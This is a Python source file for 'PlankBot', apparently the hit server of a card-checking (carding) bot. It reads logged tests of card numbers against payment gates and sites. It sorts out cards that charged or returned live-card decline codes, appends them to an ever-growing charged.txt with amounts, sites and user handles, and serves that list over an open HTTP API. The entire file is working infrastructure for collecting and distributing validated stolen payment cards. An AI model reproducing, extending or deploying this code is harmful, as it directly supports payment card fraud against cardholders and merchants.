"""
PlankBot — Hit API Server
- Serves charged/approved hits from SQLite on port 8181
- Maintains charged.txt (append-only, never deleted)
- Background thread appends new charged hits as they arrive
Run: python hitserver.py
"""

import json
import os
import sqlite3
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime

DB_PATH      = "/root/projects/PlankBot/plankbot.db"
TXT_PATH     = "/root/projects/PlankBot/charged.txt"
PORT         = 8181
POLL_SEC     = 5

CHARGED_LIKE  = ["CHARGED", "ORDER_PLACED", "ORDER_PROCESSING"]
APPROVED_LIKE = ["3DS_REQUIRED", "INSUFFICIENT_FUNDS", "INVALID_CVC",
                 "DO_NOT_HONOR", "PICKUP_CARD", "LIMIT_EXCEEDED",
                 "AUTHENTICATION_REQUIRED", "3DS_SECURED"]

_last_id = 0
_lock    = threading.Lock()


def db_connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def charged_where():
    parts  = " OR ".join(["response LIKE ?" for _ in CHARGED_LIKE])
    params = [f"%{p}%" for p in CHARGED_LIKE]
    return parts, params


def approved_where():
    parts  = " OR ".join(["response LIKE ?" for _ in APPROVED_LIKE])
    params = [f"%{p}%" for p in APPROVED_LIKE]
    return parts, params


def row_to_dict(r):
    ts = r["timestamp"]
    return {
        "id":       r["id"],
        "user_id":  r["user_id"],
        "username": r["username"] or str(r["user_id"]),
        "gate":     r["gate"] or "N/A",
        "card":     r["card"] or "",
        "response": r["response"] or "",
        "amount":   r["amount"] or "0.00",
        "site":     r["site"] or "N/A",
        "time":     datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M:%S") if ts else "N/A",
    }


def fetch_hits(limit=500):
    conn  = db_connect()
    cw, cp = charged_where()
    aw, ap = approved_where()

    charged = conn.execute(
        f"SELECT h.id, h.user_id, u.username, h.gate, h.card, h.response, h.amount, h.site, h.timestamp "
        f"FROM hit_log h LEFT JOIN users u ON h.user_id = u.user_id "
        f"WHERE ({cw}) AND response NOT LIKE '%Not charged%' "
        f"ORDER BY h.id DESC LIMIT ?",
        cp + [limit]
    ).fetchall()

    approved = conn.execute(
        f"SELECT h.id, h.user_id, u.username, h.gate, h.card, h.response, h.amount, h.site, h.timestamp "
        f"FROM hit_log h LEFT JOIN users u ON h.user_id = u.user_id "
        f"WHERE ({aw}) "
        f"ORDER BY h.id DESC LIMIT ?",
        ap + [limit]
    ).fetchall()

    conn.close()
    return [row_to_dict(r) for r in charged], [row_to_dict(r) for r in approved]


def seed_charged_txt():
    """On startup: load ALL historical charged hits into charged.txt (skip already saved)."""
    global _last_id

    existing_cards = set()
    if os.path.exists(TXT_PATH):
        with open(TXT_PATH, "r", encoding="utf-8") as f:
            for line in f:
                card = line.strip().split(" | ")[0] if " | " in line else line.strip()
                existing_cards.add(card)

    conn  = db_connect()
    cw, cp = charged_where()
    rows  = conn.execute(
        f"SELECT h.id, h.user_id, u.username, h.gate, h.card, h.response, h.amount, h.site, h.timestamp "
        f"FROM hit_log h LEFT JOIN users u ON h.user_id = u.user_id "
        f"WHERE ({cw}) AND response NOT LIKE '%Not charged%' "
        f"ORDER BY h.id ASC",
        cp
    ).fetchall()

    max_id   = 0
    new_lines = []
    for r in rows:
        card = r["card"] or ""
        if card not in existing_cards:
            ts   = r["timestamp"]
            time_str = datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M:%S") if ts else "N/A"
            line = f"{card} | ${r['amount'] or '0.00'} | {r['gate'] or 'N/A'} | {r['site'] or 'N/A'} | @{r['username'] or r['user_id']} | {time_str}"
            new_lines.append(line)
            existing_cards.add(card)
        if r["id"] > max_id:
            max_id = r["id"]

    conn.close()

    if new_lines:
        with open(TXT_PATH, "a", encoding="utf-8") as f:
            f.write("\n".join(new_lines) + "\n")
        print(f"[hitserver] seeded {len(new_lines)} charged hits into charged.txt")

    with _lock:
        _last_id = max_id
    print(f"[hitserver] charged.txt ready — watching from id={_last_id}")


def poll_new_charged():
    """Background thread: append new charged hits to charged.txt."""
    global _last_id

    existing_cards = set()
    if os.path.exists(TXT_PATH):
        with open(TXT_PATH, "r", encoding="utf-8") as f:
            for line in f:
                card = line.strip().split(" | ")[0] if " | " in line else line.strip()
                existing_cards.add(card)

    while True:
        time.sleep(POLL_SEC)
        try:
            with _lock:
                since = _last_id

            conn  = db_connect()
            cw, cp = charged_where()
            rows  = conn.execute(
                f"SELECT h.id, h.user_id, u.username, h.gate, h.card, h.response, h.amount, h.site, h.timestamp "
                f"FROM hit_log h LEFT JOIN users u ON h.user_id = u.user_id "
                f"WHERE id > ? AND ({cw}) AND response NOT LIKE '%Not charged%' "
                f"ORDER BY h.id ASC",
                [since] + cp
            ).fetchall()
            conn.close()

            new_lines = []
            max_id    = since
            for r in rows:
                card = r["card"] or ""
                if card not in existing_cards:
                    ts   = r["timestamp"]
                    time_str = datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M:%S") if ts else "N/A"
                    line = f"{card} | ${r['amount'] or '0.00'} | {r['gate'] or 'N/A'} | {r['site'] or 'N/A'} | @{r['username'] or r['user_id']} | {time_str}"
                    new_lines.append(line)
                    existing_cards.add(card)
                    print(f"[hitserver] new charged: {card}")
                if r["id"] > max_id:
                    max_id = r["id"]

            if new_lines:
                with open(TXT_PATH, "a", encoding="utf-8") as f:
                    f.write("\n".join(new_lines) + "\n")

            with _lock:
                _last_id = max_id

        except Exception as e:
            print(f"[hitserver] poll error: {e}")


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/hits":
            try:
                charged, approved = fetch_hits()
                body = json.dumps({"charged": charged, "approved": approved}).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body)
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())

        elif self.path == "/charged_txt":
            try:
                if os.path.exists(TXT_PATH):
                    with open(TXT_PATH, "r", encoding="utf-8") as f:
                        content = f.read()
                else:
                    content = ""
                body = content.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body)
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())

        elif self.path == "/charged_count":
            try:
                count = 0
                if os.path.exists(TXT_PATH):
                    with open(TXT_PATH, "r", encoding="utf-8") as f:
                        count = sum(1 for line in f if line.strip())
                body = json.dumps({"count": count}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body)
            except Exception as e:
                self.send_response(500)
                self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print(f"[hitserver] DB      : {DB_PATH}")
    print(f"[hitserver] TXT     : {TXT_PATH}")
    print(f"[hitserver] Port    : {PORT}")

    seed_charged_txt()

    t = threading.Thread(target=poll_new_charged, daemon=True)
    t.start()

    print(f"[hitserver] serving on :{PORT}")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
